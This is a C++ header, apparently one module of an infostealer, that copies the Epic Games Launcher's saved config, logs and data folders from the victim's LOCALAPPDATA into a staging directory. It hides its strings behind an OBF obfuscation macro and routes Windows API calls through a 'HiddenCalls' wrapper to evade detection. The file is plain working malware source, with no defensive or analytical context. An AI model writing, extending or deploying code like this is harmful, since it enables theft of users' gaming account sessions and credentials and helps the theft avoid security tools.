#ifndef EPICGAMES_HPP
#define EPICGAMES_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace EpicGames {
    inline void Extract(const std::string& baseDir) {
        std::string epicGamesFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("EpicGamesLauncher");
        if (!fs::exists(epicGamesFolder)) return;

        std::string targetDir = baseDir + "\\" + OBF("EpicGames");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        HiddenCalls::CopyDirectory((epicGamesFolder + "\\" + OBF("Saved\\Config")).c_str(), (targetDir + "\\" + OBF("Config")).c_str());
        HiddenCalls::CopyDirectory((epicGamesFolder + "\\" + OBF("Saved\\Logs")).c_str(), (targetDir + "\\" + OBF("Logs")).c_str());
        HiddenCalls::CopyDirectory((epicGamesFolder + "\\" + OBF("Saved\\Data")).c_str(), (targetDir + "\\" + OBF("Data")).c_str());
    }
}

#endif
